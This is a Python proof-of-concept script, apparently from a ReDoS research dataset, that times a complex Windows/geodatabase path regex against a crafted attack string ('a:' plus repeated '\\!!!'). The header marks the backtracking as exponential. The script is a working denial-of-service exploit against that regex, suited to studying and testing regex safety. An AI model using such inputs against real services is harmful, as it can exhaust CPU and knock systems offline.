# 3764
# (?=^.{1,160}$)^(?:(((?:([a-zA-Z]\:)|(\\{2}[a-zA-Z]\w*)))((?:\\((?:(?![\w\.]*\.(?:gdb|mdb|sde|mdf))[^\\/:*?<>"| .]+[^\\/:*?<>"|]*[^\\/:*?<>"| .]+)))*)(?:\\(([a-zA-Z]\w*)(\.(?:gdb|mdb|sde|mdf))))?)\\?([a-zA-Z]\w*)?(?:\\([a-zA-Z]\w*(?:\.shp)?)(?<!.+(?:\.(?:gdb|mdb|sde|mdf)).+\.shp|(?<!.+(?:\.(?:gdb|mdb|sde|mdf)).+)(?<!.+\.shp))))$
# EXPONENT
# nums:4
# EXPONENT AttackString:"a:"+"\\!!!"*16+"! _1_EOA(i or ii)"

import re
from time import perf_counter

regex = """(?=^.{1,160}$)^(?:(((?:([a-zA-Z]\:)|(\\{2}[a-zA-Z]\w*)))((?:\\((?:(?![\w\.]*\.(?:gdb|mdb|sde|mdf))[^\\/:*?<>"| .]+[^\\/:*?<>"|]*[^\\/:*?<>"| .]+)))*)(?:\\(([a-zA-Z]\w*)(\.(?:gdb|mdb|sde|mdf))))?)\\?([a-zA-Z]\w*)?(?:\\([a-zA-Z]\w*(?:\.shp)?)(?<!.+(?:\.(?:gdb|mdb|sde|mdf)).+\.shp|(?<!.+(?:\.(?:gdb|mdb|sde|mdf)).+)(?<!.+\.shp))))$"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "a:" + "\\!!!" * i * 1 + "! _1_EOA(i or ii)"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")